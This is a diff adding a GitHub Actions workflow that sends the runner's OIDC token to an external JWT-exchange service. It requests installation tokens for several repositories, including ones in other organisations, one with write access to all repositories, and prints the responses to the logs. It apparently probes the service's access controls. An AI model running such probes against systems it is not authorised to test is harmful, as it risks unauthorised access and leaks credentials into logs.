@@ -1,0 +1,38 @@
+name: oidc-matrix2
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  m:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - {label: k1_lite_read_target, tgt: synkube/lite-argo-apps, perm: '{"contents":"read"}', scope: target}
+          - {label: k2_lite_all,         tgt: synkube/lite-argo-apps, perm: '{"contents":"write"}', scope: all}
+          - {label: k3_actions,          tgt: synkube/actions,        perm: '{"contents":"read"}', scope: target}
+          - {label: k4_liteinfra,        tgt: synkube/lite-infra,     perm: '{"contents":"read"}', scope: target}
+          - {label: k5_sanguine,         tgt: synapsecns/sanguine,    perm: '{"contents":"read"}', scope: target}
+          - {label: k6_same,             tgt: ARPmt/ansible-test,     perm: '{"contents":"read"}', scope: target}
+    env:
+      TGT: ${{ matrix.tgt }}
+      PERMJ: ${{ matrix.perm }}
+      SCOPE: ${{ matrix.scope }}
+      LABEL: ${{ matrix.label }}
+    steps:
+      - name: probe
+        run: |
+          set -ueo pipefail
+          echo "REPO=${GITHUB_REPOSITORY} REF=${GITHUB_REF} EVENT=${GITHUB_EVENT_NAME} LABEL=${LABEL} TGT=${TGT} PERMJ=${PERMJ} SCOPE=${SCOPE}"
+          RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://jwt-exchange")
+          TOK=$(printf '%s' "$RESP" | jq -r '.value // empty')
+          body=$(jq -cn --arg t "$TOK" --arg tgt "$TGT" --arg p "$PERMJ" --arg s "$SCOPE" '{subject_token:$t,resource:{type:"github_repository",id:$tgt},requested:({github_permissions:($p|fromjson)} + (if $s=="all" then {installation_repository_scope:"all"} else {} end)),exchange_profile:"github_actions_to_installation"}')
+          out=$(curl -sS -m 30 -w '\nHTTP=%{http_code}' -X POST https://jwt-exchange.synkube.com/api/v2/exchange/token -H 'Content-Type: application/json' -d "$body")
+          echo "EXCH[${LABEL}] => $(printf '%s' "$out" | tr '\n' ' ' | head -c 700)"
+          echo "TOKENLEN=$(printf '%s' "$out" | head -1 | jq -r '.token // "" | length' 2>/dev/null || echo 0)"
